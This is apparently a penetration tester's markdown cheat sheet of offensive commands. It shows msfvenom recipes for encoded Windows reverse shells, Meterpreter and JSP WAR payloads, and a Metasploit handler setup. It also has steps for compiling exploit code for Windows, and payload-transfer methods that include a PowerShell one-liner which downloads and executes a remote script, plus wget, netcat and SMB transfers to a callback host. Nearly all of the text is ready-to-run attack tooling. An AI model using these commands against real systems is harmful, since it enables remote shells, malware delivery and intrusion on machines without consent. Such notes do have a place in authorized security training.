# Using and Transfering Vulnerabilities

## === MSVenom ===

### [MSFVenom Cheatsheet](https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/)
(Below are some of my most used examples)
```bash
# windows encoded reverse tcp shell
msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.1 LPORT=1337 -e shikata_ga_nai -i 3 -f exe > shell.exe
# windows encoded meterpreter reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=1337 -e shikata_ga_nai -i 3 -f exe > encoded.exe
# war file
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.1 LPORT=1337 -f war > shell.war
# metasploit handler
msfconsole
use exploit/multi/handler
set lhost 192.168.1.1
set lport 1337
run
```

### B0F
```bash
# compiling as exe for meterpreter reverse tcp shell
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=1337 -e x86/shikata_ga_nai -f exe -o exploit.exe
```

## === Compiling Exploits ===

### C Code
```bash
# compiling c
gcc exploit.c -o exploit
# including pthread
gcc -pthread exploit.c -o exploit
# specific architecture (gcc-multilib)
sudo apt-get install gcc-multilib
gcc -m32 exploit.c -o exploit
gcc -m64 exploit.c -o exploit
# compiling to exe for different architecture
sudo apt-get install mingw-64
i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32
```

## === Transfering Vulnerabilities ===

### Simple HTTP Server
(Very useful, suggest making an alias for it!)
```bash
python -m SimpleHTTPServer
wget https://192.168.1.1:8000/x -O /dev/shm/x
chmod 775 x
```

### Netcat Transfer
```bash
nc -nvlp 8080 > /dev/shm/x
nc 10.10.10.1 8080 < ./x
```

### Powershell
```bash
# execute remote program
powershell iex(new-object net.webclient).downloadString('http://192.168.1.1:8000/file.ps1')
# download remote file
powersehll invoke-webrequest -uri "http://192.168.1.1/nc.exe" -outfile "nc.exe"
```

### Samba Server
```bash
sudo smbserver.py share .
copy \\192.168.1.1\share\file.txt file.txt
```

